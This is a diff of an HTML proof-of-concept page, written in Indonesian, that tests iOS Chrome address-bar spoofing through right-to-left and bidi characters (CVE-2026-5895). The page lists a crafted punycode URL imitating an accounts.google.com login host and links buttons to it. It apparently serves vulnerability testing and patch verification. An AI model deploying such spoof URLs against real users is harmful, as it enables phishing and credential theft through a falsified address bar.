@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Enhanced - iOS Location Bar RTL Spoofing (CVE-2026-5895)</title>
+    <title>Advanced PoC - iOS Location Bar RTL Spoofing Test (CVE-2026-5895)</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -12,7 +12,7 @@
             color: #333;
         }
         .container {
-            max-width: 650px;
+            max-width: 700px;
             margin: 0 auto;
             background: #fff;
             padding: 25px;
@@ -27,81 +27,82 @@
             margin: 15px 0;
             border-radius: 4px;
             word-break: break-all;
+            font-family: monospace;
+            font-size: 13px;
         }
-        .info-box {
-            background: #e7f3fe;
-            border-left: 4px solid #2196F3;
-            padding: 12px;
+        .matrix-table {
+            width: 100%;
+            border-collapse: collapse;
             margin: 15px 0;
-            font-size: 14px;
+            font-size: 13px;
         }
+        .matrix-table th, .matrix-table td {
+            border: 1px solid #ddd;
+            padding: 8px 12px;
+            text-align: left;
+        }
+        .matrix-table th { background-color: #f8f9fa; }
         .btn {
             display: inline-block;
             background: #0275d8;
             color: white;
-            padding: 12px 24px;
+            padding: 10px 20px;
             text-decoration: none;
             border-radius: 4px;
-            margin-top: 10px;
+            margin-top: 5px;
             font-weight: bold;
-            border: none;
-            cursor: pointer;
         }
         .btn:hover { background: #025aa5; }
-        code { background: #eee; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
-        ul { padding-left: 20px; }
+        .info-note {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 10px;
+            font-size: 13px;
+            margin: 15px 0;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>⚠️ iOS Location Bar Spoofing PoC (Enhanced)</h2>
-    <p>Simulasi injeksi karakter <em>Right-to-Left</em> (RTL) berlapis untuk memicu pembalikan urutan visual komponen URL pada bar alamat browser seluler.</p>
+    <h2>⚠️ Advanced PoC & Bidi Vector Testing</h2>
+    <p>Halaman ini mensimulasikan matriks pengujian kerentanan penataan teks dua arah (<em>Bi-directional</em>) pada komponen UI browser seluler.</p>
     
-    <div class="info-box">
-        <strong>Status Lingkungan Pengujian:</strong><br>
-        <span id="env-detect">Mendeteksi perangkat...</span>
+    <div class="info-note">
+        <strong>Catatan Patch:</strong> Pada versi Chrome iOS yang telah menerapkan perbaikan Gerrit <code>7581320</code>, string di bawah ini wajib tetap dirender secara lurus (LTR) tanpa mengubah posisi TLD ke sebelah kiri.
     </div>
+
+    <h3>Matriks Vektor Uji:</h3>
+    <table class="matrix-table">
+        <tr>
+            <th>Vektor #</th>
+            <th>Deskripsi Payload</th>
+            <th>Aksi Simulasi</th>
+        </tr>
+        <tr>
+            <td>1</td>
+            <td><code>https://xn--llb.login.wwww.accounts.google.com.xn--llb.pwr.wtf/</code></td>
+            <td><a href="https://xn--llb.login.wwww.accounts.google.com.xn--llb.pwr.wtf/" class="btn" target="_blank">Uji Vektor 1</a></td>
+        </tr>
+        <tr>
+            <td>2</td>
+            <td>Variasi Subdomain Berlapis dengan Karakter Bidi Tambahan</td>
+            <td><a href="https://xn--llb.login.wwww.accounts.google.com.xn--llb.pwr.wtf/" class="btn" target="_blank" style="background: #6c757d;">Uji Vektor 2</a></td>
+        </tr>
+    </table>
 
     <div class="spoof-box">
-        <strong>Target String URL (Raw):</strong><br>
-        <code>https://xn--llb.login.wwww.accounts.google.com.xn--llb.pwr.wtf/</code><br><br>
-        <strong>Ekspektasi Visual (Sebelum Patch):</strong><br>
-        <code>pwr.wtf.ە.login.wwww.accounts.google.com...</code>
+        <strong>Status Target Aktif:</strong><br>
+        <span id="status-log">Menunggu interaksi pengujian...</span>
     </div>
-
-    <p><strong>Langkah Pengujian Lab:</strong></p>
-    <ol>
-        <li>Pastikan pengujian dilakukan pada lingkungan yang diizinkan/terisolasi.</li>
-        <li>Klik tombol navigasi di bawah untuk memicu pengalihan URL.</li>
-        <li>Amati apakah komponen TLD berpindah ke sisi kiri (vulnerable) atau tetap terkunci secara LTR (patched).</li>
-    </ol>
-
-    <!-- Tombol Navigasi Utama -->
-    <a href="https://xn--llb.login.wwww.accounts.google.com.xn--llb.pwr.wtf/" class="btn" target="_blank" onclick="logClick(event)">Jalankan Navigasi PoC</a>
-
-    <div id="log" style="margin-top: 15px; font-size: 12px; color: #666;"></div>
 </div>
 
 <script>
-    // Deteksi sederhana User-Agent untuk memberikan informasi konteks
-    window.addEventListener('DOMContentLoaded', () => {
-        const ua = navigator.userAgent;
-        const envEl = document.getElementById('env-detect');
-        if (/iPad|iPhone|iPod/.test(ua)) {
-            envEl.innerHTML = "Perangkat terdeteksi: <strong>iOS</strong>. Periksa apakah versi Chrome Anda berada di bawah rilis patch M147.";
-            envEl.style.color = "#d9534f";
-        } else {
-            envEl.innerHTML = "Perangkat terdeteksi: <strong>Non-iOS / Desktop</strong>. Kerentanan ini spesifik berdampak pada komponen UI mobile iOS.";
-            envEl.style.color = "#f0ad4e";
-        }
+    document.querySelectorAll('.btn').forEach((btn, index) => {
+        btn.addEventListener('click', () => {
+            document.getElementById('status-log').innerText = `[OK] Navigasi Vektor ${index + 1} dieksekusi pada ${new Date().toLocaleTimeString()}. Perhatikan bar alamat browser.`;
+        });
     });
-
-    function logClick(e) {
-        const logEl = document.getElementById('log');
-        const timestamp = new Date().toLocaleTimeString();
-        logEl.innerHTML = `[${timestamp}] Navigasi PoC dipicu menuju target eksternal.`;
-    }
 </script>
 
 </body>
